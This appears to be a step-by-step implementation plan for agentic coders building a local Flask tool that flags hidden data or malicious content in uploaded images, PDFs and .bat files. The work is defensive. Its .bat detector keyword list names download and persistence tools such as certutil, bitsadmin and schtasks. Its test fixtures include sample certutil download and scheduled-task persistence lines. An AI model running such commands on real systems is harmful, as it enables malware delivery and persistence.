# Steganography & Suspicious File Detector Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a simple Flask web app where a user uploads an image (.png/.jpg/.jpeg), a PDF, or a .bat file and gets back a plain-language verdict on whether it shows signs of hidden data or malicious content.

**Architecture:** One Flask route (`GET`/`POST /`) dispatches an uploaded file to one of three independent detector modules based on file extension, then renders the verdict and findings on the same page. Stateless — no database, no history.

**Tech Stack:** Python, Flask, Pillow (image handling), pikepdf (PDF object inspection), pytest (testing).

**Spec:** `docs/superpowers/specs/2026-08-24-stego-file-detector-design.md`

## Global Constraints

- Detection only — no payload extraction/decoding of any kind.
- No LSB/statistical analysis, chi-square tests, or other stego math — heuristics only.
- Stateless: no database, no scan history, no accounts.
- Supported file types only: `.png`, `.jpg`, `.jpeg`, `.pdf`, `.bat`.
- Max upload size: 10MB.
- Runs locally only (`python app.py`), no deployment/hosting setup.
- Every detector function must catch its own parse errors and return a finding rather than raising, except for truly unexpected exceptions, which `app.py` catches generically.

---

### Task 1: Project scaffolding and minimal Flask skeleton

**Files:**
- Create: `requirements.txt`
- Create: `app.py`
- Create: `templates/index.html`
- Create: `static/style.css`
- Test: `tests/test_app.py`

**Interfaces:**
- Produces: a Flask `app` object in `app.py` with a `GET /` route that renders `templates/index.html`. Later tasks add detector imports and `POST` handling to this same file.

- [ ] **Step 1: Create `requirements.txt`**

```
Flask
Pillow
pikepdf
pytest
```

- [ ] **Step 2: Write the failing test**

Create `tests/test_app.py`:

```python
from app import app


def test_index_get_shows_upload_form():
    client = app.test_client()
    response = client.get("/")
    assert response.status_code == 200
    assert b'type="file"' in response.data
```

- [ ] **Step 3: Run test to verify it fails**

Run: `pytest tests/test_app.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'app'` (or import error, since `app.py` doesn't exist yet).

- [ ] **Step 4: Create the minimal Flask app and template**

Create `app.py`:

```python
from flask import Flask, render_template, request

app = Flask(__name__)


@app.route("/", methods=["GET", "POST"])
def index():
    return render_template("index.html", result=None, error=None)


if __name__ == "__main__":
    app.run(debug=True)
```

Create `templates/index.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Suspicious File Detector</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <h1>Suspicious File Detector</h1>
    <p>Upload an image (.png/.jpg/.jpeg), a PDF, or a .bat file to check for signs of hidden data or malicious content.</p>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">Scan</button>
    </form>

    {% if error %}
    <p class="error">{{ error }}</p>
    {% endif %}

    {% if result %}
    <div class="result">
        <h2>Result for {{ result.filename }}</h2>
        {% if result.is_suspicious %}
        <p class="verdict suspicious">{{ result.findings|length }} suspicious indicator(s) found</p>
        {% else %}
        <p class="verdict clean">No suspicious indicators found</p>
        {% endif %}
        <ul>
        {% for finding in result.findings %}
            <li>{{ finding }}</li>
        {% endfor %}
        </ul>
    </div>
    {% endif %}
</body>
</html>
```

Create `static/style.css`:

```css
body {
    font-family: sans-serif;
    max-width: 640px;
    margin: 2rem auto;
    padding: 0 1rem;
}

.verdict.clean {
    color: #1a7a1a;
    font-weight: bold;
}

.verdict.suspicious {
    color: #b30000;
    font-weight: bold;
}

.error {
    color: #b30000;
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `pytest tests/test_app.py -v`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add requirements.txt app.py templates/index.html static/style.css tests/test_app.py
git commit -m "Add minimal Flask skeleton with upload form"
```

---

### Task 2: `.bat` file detector

**Files:**
- Create: `detectors/__init__.py` (empty)
- Create: `detectors/bat_detector.py`
- Test: `tests/test_bat_detector.py`

**Interfaces:**
- Produces: `scan_bat(text: str) -> tuple[bool, list[str]]` in `detectors/bat_detector.py`. Returns `(is_suspicious, findings)` where each finding is a human-readable string naming the line number, matched keyword, and reason.

- [ ] **Step 1: Write the failing tests**

Create `detectors/__init__.py` (empty file).

Create `tests/test_bat_detector.py`:

```python
from detectors.bat_detector import scan_bat


def test_clean_bat_is_not_suspicious():
    text = "@echo off\necho Hello world\ndir\n"
    is_suspicious, findings = scan_bat(text)
    assert is_suspicious is False
    assert findings == []


def test_download_command_is_flagged():
    text = "@echo off\ncertutil -urlcache -f http://example.com/a.exe a.exe\n"
    is_suspicious, findings = scan_bat(text)
    assert is_suspicious is True
    assert any("certutil" in f and "Line 2" in f for f in findings)


def test_multiple_suspicious_lines_are_all_flagged():
    text = (
        "@echo off\n"
        "set payload=base64encodedstuff\n"
        "schtasks /create /tn evil /tr evil.exe /sc onlogon\n"
    )
    is_suspicious, findings = scan_bat(text)
    assert is_suspicious is True
    assert len(findings) >= 2
    assert any("base64" in f for f in findings)
    assert any("schtasks" in f for f in findings)
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_bat_detector.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'detectors.bat_detector'`

- [ ] **Step 3: Write the minimal implementation**

Create `detectors/bat_detector.py`:

```python
PATTERNS = [
    ("certutil", "downloads/decodes files via certutil, a common LOLBin technique"),
    ("bitsadmin", "downloads files via BITS, a common LOLBin technique"),
    ("powershell -enc", "runs base64-encoded PowerShell, often used to hide commands"),
    ("curl", "downloads files via curl"),
    ("wget", "downloads files via wget"),
    ("netsh firewall", "modifies firewall settings, possibly to disable protection"),
    ("sc stop", "stops a Windows service, possibly a security service"),
    ("base64", "references base64 encoding, often used to obfuscate commands"),
    ("reg add", "modifies the registry, possibly for persistence"),
    ("schtasks", "creates a scheduled task, a common persistence technique"),
]


def scan_bat(text: str) -> tuple[bool, list[str]]:
    findings = []
    for line_number, line in enumerate(text.splitlines(), start=1):
        lower_line = line.lower()
        for keyword, reason in PATTERNS:
            if keyword in lower_line:
                findings.append(f"Line {line_number}: matched '{keyword}' - {reason}")
    return (len(findings) > 0, findings)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_bat_detector.py -v`
Expected: PASS (3 passed)

- [ ] **Step 5: Commit**

```bash
git add detectors/__init__.py detectors/bat_detector.py tests/test_bat_detector.py
git commit -m "Add .bat suspicious pattern detector"
```

---

### Task 3: Image steganography detector

**Files:**
- Create: `detectors/image_detector.py`
- Test: `tests/test_image_detector.py`

**Interfaces:**
- Consumes: none from other tasks.
- Produces: `scan_image(file_bytes: bytes) -> tuple[bool, list[str]]` in `detectors/image_detector.py`. Returns `(is_suspicious, findings)`.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_image_detector.py`:

```python
import io

from PIL import Image

from detectors.image_detector import scan_image


def _make_png_bytes(size=(2, 2)):
    buf = io.BytesIO()
    Image.new("RGB", size, color=(10, 20, 30)).save(buf, format="PNG")
    return buf.getvalue()


def _make_jpeg_bytes(size=(2, 2)):
    buf = io.BytesIO()
    Image.new("RGB", size, color=(10, 20, 30)).save(buf, format="JPEG")
    return buf.getvalue()


def test_clean_png_is_not_suspicious():
    is_suspicious, findings = scan_image(_make_png_bytes())
    assert is_suspicious is False
    assert findings == []


def test_png_with_small_appended_data_is_flagged():
    data = _make_png_bytes() + b"junkdata12345"
    is_suspicious, findings = scan_image(data)
    assert is_suspicious is True
    assert any("appended" in f.lower() for f in findings)


def test_png_with_large_appended_data_is_flagged_as_oversized_too():
    data = _make_png_bytes() + (b"X" * 5000)
    is_suspicious, findings = scan_image(data)
    assert is_suspicious is True
    assert any("appended" in f.lower() for f in findings)
    assert any("unusually large" in f.lower() for f in findings)


def test_clean_jpeg_is_not_suspicious():
    is_suspicious, findings = scan_image(_make_jpeg_bytes())
    assert is_suspicious is False
    assert findings == []


def test_jpeg_with_appended_data_is_flagged():
    data = _make_jpeg_bytes() + b"junkdata12345"
    is_suspicious, findings = scan_image(data)
    assert is_suspicious is True
    assert any("appended" in f.lower() for f in findings)
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_image_detector.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'detectors.image_detector'`

- [ ] **Step 3: Write the minimal implementation**

Create `detectors/image_detector.py`:

```python
import io

from PIL import Image

PNG_SIGNATURE = b"\x89PNG\r\n\x1a\n"
JPEG_SOI = b"\xff\xd8"


def scan_image(file_bytes: bytes) -> tuple[bool, list[str]]:
    findings = []

    if file_bytes.startswith(PNG_SIGNATURE):
        findings.extend(_check_png(file_bytes))
    elif file_bytes.startswith(JPEG_SOI):
        findings.extend(_check_jpeg(file_bytes))
    else:
        findings.append("Unrecognized image format; could not run format-specific checks")

    findings.extend(_check_size_vs_dimensions(file_bytes))

    return (len(findings) > 0, findings)


def _check_png(data: bytes) -> list[str]:
    idx = data.find(b"IEND")
    if idx == -1:
        return ["PNG is missing its IEND chunk; file may be corrupted or manipulated"]
    end_of_chunk = idx + 4 + 4  # "IEND" (4 bytes) + CRC (4 bytes)
    if end_of_chunk < len(data):
        extra = len(data) - end_of_chunk
        return [f"{extra} byte(s) of data found appended after PNG's IEND chunk"]
    return []


def _check_jpeg(data: bytes) -> list[str]:
    idx = data.find(b"\xff\xd9")
    if idx == -1:
        return ["JPEG is missing its end-of-image marker (FFD9); file may be corrupted or manipulated"]
    end_of_marker = idx + 2
    if end_of_marker < len(data):
        extra = len(data) - end_of_marker
        return [f"{extra} byte(s) of data found appended after JPEG's end-of-image marker"]
    return []


def _check_size_vs_dimensions(data: bytes) -> list[str]:
    try:
        with Image.open(io.BytesIO(data)) as img:
            width, height = img.size
    except Exception:
        return []

    raw_size = width * height * 3
    if raw_size > 0 and len(data) > raw_size * 1.5 + 1024:
        return [f"File size ({len(data)} bytes) is unusually large for a {width}x{height} image"]
    return []
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_image_detector.py -v`
Expected: PASS (5 passed)

- [ ] **Step 5: Commit**

```bash
git add detectors/image_detector.py tests/test_image_detector.py
git commit -m "Add image steganography heuristic detector"
```

---

### Task 4: PDF suspicious object detector

**Files:**
- Create: `detectors/pdf_detector.py`
- Test: `tests/test_pdf_detector.py`

**Interfaces:**
- Consumes: none from other tasks.
- Produces: `scan_pdf(file_bytes: bytes) -> tuple[bool, list[str]]` in `detectors/pdf_detector.py`. Returns `(is_suspicious, findings)`.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_pdf_detector.py`:

```python
import io

import pikepdf

from detectors.pdf_detector import scan_pdf


def _make_clean_pdf_bytes():
    pdf = pikepdf.Pdf.new()
    pdf.add_blank_page()
    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()


def _make_pdf_with_javascript_bytes():
    pdf = pikepdf.Pdf.new()
    pdf.add_blank_page()
    pdf.Root.OpenAction = pdf.make_indirect(
        pikepdf.Dictionary(S=pikepdf.Name("/JavaScript"), JS="app.alert('hi');")
    )
    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()


def test_clean_pdf_is_not_suspicious():
    is_suspicious, findings = scan_pdf(_make_clean_pdf_bytes())
    assert is_suspicious is False
    assert findings == []


def test_pdf_with_javascript_is_flagged():
    is_suspicious, findings = scan_pdf(_make_pdf_with_javascript_bytes())
    assert is_suspicious is True
    assert any("JavaScript" in f or "/JS" in f for f in findings)


def test_pdf_with_trailing_data_after_eof_is_flagged():
    data = _make_clean_pdf_bytes() + b"\nEXTRA HIDDEN DATA HERE"
    is_suspicious, findings = scan_pdf(data)
    assert is_suspicious is True
    assert any("appended" in f.lower() for f in findings)


def test_unparsable_pdf_is_flagged_not_raised():
    is_suspicious, findings = scan_pdf(b"not a real pdf file")
    assert is_suspicious is True
    assert len(findings) >= 1
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_pdf_detector.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'detectors.pdf_detector'`

- [ ] **Step 3: Write the minimal implementation**

Create `detectors/pdf_detector.py`:

```python
import io

import pikepdf

SUSPICIOUS_KEYS = ["/JavaScript", "/JS", "/EmbeddedFile", "/Launch"]


def scan_pdf(file_bytes: bytes) -> tuple[bool, list[str]]:
    findings = []

    try:
        with pikepdf.open(io.BytesIO(file_bytes)) as pdf:
            for obj in pdf.objects:
                try:
                    obj_str = str(obj)
                except Exception:
                    continue
                for key in SUSPICIOUS_KEYS:
                    if key in obj_str:
                        findings.append(
                            f"Found {key} reference in a PDF object, which can indicate "
                            "embedded scripts or files"
                        )
    except pikepdf.PdfError:
        return (True, ["PDF could not be parsed; file may be corrupted or malformed"])

    findings = list(dict.fromkeys(findings))  # dedupe repeated matches

    eof_index = file_bytes.rfind(b"%%EOF")
    if eof_index != -1:
        trailing = len(file_bytes) - (eof_index + len(b"%%EOF"))
        if trailing > 2:  # allow a trailing newline/whitespace
            findings.append(
                f"{trailing} byte(s) of data found appended after the PDF's final %%EOF marker"
            )

    return (len(findings) > 0, findings)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_pdf_detector.py -v`
Expected: PASS (4 passed)

- [ ] **Step 5: Commit**

```bash
git add detectors/pdf_detector.py tests/test_pdf_detector.py
git commit -m "Add PDF suspicious object detector"
```

---

### Task 5: Wire detectors into the Flask app

**Files:**
- Modify: `app.py`
- Modify: `tests/test_app.py`

**Interfaces:**
- Consumes: `scan_image(file_bytes: bytes) -> tuple[bool, list[str]]` from `detectors/image_detector.py`, `scan_pdf(file_bytes: bytes) -> tuple[bool, list[str]]` from `detectors/pdf_detector.py`, `scan_bat(text: str) -> tuple[bool, list[str]]` from `detectors/bat_detector.py`.
- Produces: full `POST /` behavior — validates the upload, dispatches to the right detector, and renders `result`/`error` into `templates/index.html` (already built in Task 1).

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_app.py`:

```python
def test_post_with_no_file_shows_error():
    client = app.test_client()
    response = client.post("/", data={}, content_type="multipart/form-data")
    assert response.status_code == 200
    assert b"choose a file" in response.data.lower()


def test_post_with_unsupported_extension_shows_error():
    client = app.test_client()
    data = {"file": (io.BytesIO(b"hello"), "notes.txt")}
    response = client.post("/", data=data, content_type="multipart/form-data")
    assert response.status_code == 200
    assert b"unsupported file type" in response.data.lower()


def test_post_with_oversized_file_shows_error():
    client = app.test_client()
    big_content = b"@echo off\n" + b"echo hi\n" * 2_000_000  # well over 10MB
    data = {"file": (io.BytesIO(big_content), "big.bat")}
    response = client.post("/", data=data, content_type="multipart/form-data")
    assert response.status_code == 200
    assert b"too large" in response.data.lower()


def test_post_with_clean_bat_shows_no_indicators():
    client = app.test_client()
    data = {"file": (io.BytesIO(b"@echo off\necho hello\n"), "clean.bat")}
    response = client.post("/", data=data, content_type="multipart/form-data")
    assert response.status_code == 200
    assert b"no suspicious indicators found" in response.data.lower()


def test_post_with_suspicious_bat_shows_indicators():
    client = app.test_client()
    content = b"@echo off\ncertutil -urlcache -f http://example.com/a.exe a.exe\n"
    data = {"file": (io.BytesIO(content), "rigged.bat")}
    response = client.post("/", data=data, content_type="multipart/form-data")
    assert response.status_code == 200
    assert b"suspicious indicator" in response.data.lower()
    assert b"certutil" in response.data.lower()
```

Add `import io` to the top of `tests/test_app.py` alongside the existing `from app import app`.

- [ ] **Step 2: Run tests to verify the new ones fail**

Run: `pytest tests/test_app.py -v`
Expected: the original `test_index_get_shows_upload_form` still PASSES; the five new tests FAIL (no error/result handling exists yet in the `POST` branch).

- [ ] **Step 3: Implement full `POST` handling**

Replace the contents of `app.py`:

```python
import os

from flask import Flask, render_template, request

from detectors.bat_detector import scan_bat
from detectors.image_detector import scan_image
from detectors.pdf_detector import scan_pdf

app = Flask(__name__)

MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

EXTENSION_MAP = {
    ".png": ("image", scan_image),
    ".jpg": ("image", scan_image),
    ".jpeg": ("image", scan_image),
    ".pdf": ("pdf", scan_pdf),
    ".bat": ("bat", scan_bat),
}


@app.route("/", methods=["GET", "POST"])
def index():
    result = None
    error = None

    if request.method == "POST":
        uploaded = request.files.get("file")
        if uploaded is None or uploaded.filename == "":
            error = "Please choose a file to upload."
        else:
            filename = uploaded.filename
            ext = os.path.splitext(filename)[1].lower()
            if ext not in EXTENSION_MAP:
                error = (
                    f"Unsupported file type '{ext}'. "
                    "Supported: .png, .jpg, .jpeg, .pdf, .bat"
                )
            else:
                file_bytes = uploaded.read()
                if len(file_bytes) > MAX_FILE_SIZE:
                    error = "File is too large (max 10MB)."
                else:
                    kind, scan_fn = EXTENSION_MAP[ext]
                    try:
                        if kind == "bat":
                            is_suspicious, findings = scan_fn(
                                file_bytes.decode("utf-8", errors="replace")
                            )
                        else:
                            is_suspicious, findings = scan_fn(file_bytes)
                        result = {
                            "filename": filename,
                            "is_suspicious": is_suspicious,
                            "findings": findings,
                        }
                    except Exception:
                        error = "This file couldn't be analyzed."

    return render_template("index.html", result=result, error=error)


if __name__ == "__main__":
    app.run(debug=True)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_app.py -v`
Expected: PASS (6 passed)

- [ ] **Step 5: Run the full test suite**

Run: `pytest -v`
Expected: all tests across `tests/test_app.py`, `tests/test_bat_detector.py`, `tests/test_image_detector.py`, `tests/test_pdf_detector.py` PASS.

- [ ] **Step 6: Commit**

```bash
git add app.py tests/test_app.py
git commit -m "Wire detectors into Flask upload route"
```

---

## After this plan

Once all tasks pass, manually smoke-test the app by running `python app.py` and uploading a real image, PDF, and `.bat` file through the browser at `http://127.0.0.1:5000`. After that verification, rename the project folder as the user requested (done as a manual step outside this plan, since it's a filesystem operation on the working directory itself, not a code task).
